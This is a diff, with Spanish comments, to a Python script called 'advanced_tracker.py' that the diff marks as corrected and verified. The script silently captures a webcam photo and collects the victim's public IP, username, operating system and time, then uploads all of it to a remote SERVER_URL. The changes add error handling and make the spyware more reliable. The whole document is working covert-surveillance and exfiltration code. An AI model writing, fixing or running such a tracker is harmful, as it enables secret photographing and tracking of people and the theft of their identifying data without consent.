@@ -1,4 +1,4 @@
-# advanced_tracker.py
+# advanced_tracker.py corregido y verificado
 import requests
 import platform
 import socket
@@ -13,6 +13,8 @@ def capturar_webcam(path='webcam.jpg'):
     ret, frame = cam.read()
     if ret:
         cv2.imwrite(path, frame)
+    else:
+        print("⚠️ No se pudo capturar imagen de la webcam")
     cam.release()
 
 def recolectar_info():
@@ -20,21 +22,30 @@ def recolectar_info():
         ip_publica = requests.get('https://api.ipify.org').text
     except:
         ip_publica = 'No obtenido'
+    usuario = getpass.getuser()
+    sistema = f"{platform.system()} {platform.release()}"
+    hora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     return {
         'ip': ip_publica,
-        'usuario': getpass.getuser(),
-        'sistema': f"{platform.system()} {platform.release()}",
-        'hora': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        'usuario': usuario,
+        'sistema': sistema,
+        'hora': hora
     }
 
 def enviar_reporte():
     capturar_webcam('webcam.jpg')
     info = recolectar_info()
-    print('📤 INFO:', info)
-
-    files = {'imagen': open('webcam.jpg', 'rb')}
-    response = requests.post(SERVER_URL, data=info, files=files)
-    print('✅ STATUS:', response.status_code, response.text)
+    print("📤 Datos recolectados:")
+    for k, v in info.items():
+        print(f"  {k}: {v}")
+    
+    try:
+        with open('webcam.jpg', 'rb') as img:
+            files = {'imagen': img}
+            response = requests.post(SERVER_URL, data=info, files=files)
+            print(f"✅ Enviado: {response.status_code} - {response.text}")
+    except Exception as e:
+        print("❌ Error al enviar reporte:", e)
 
 if __name__ == '__main__':
     enviar_reporte()
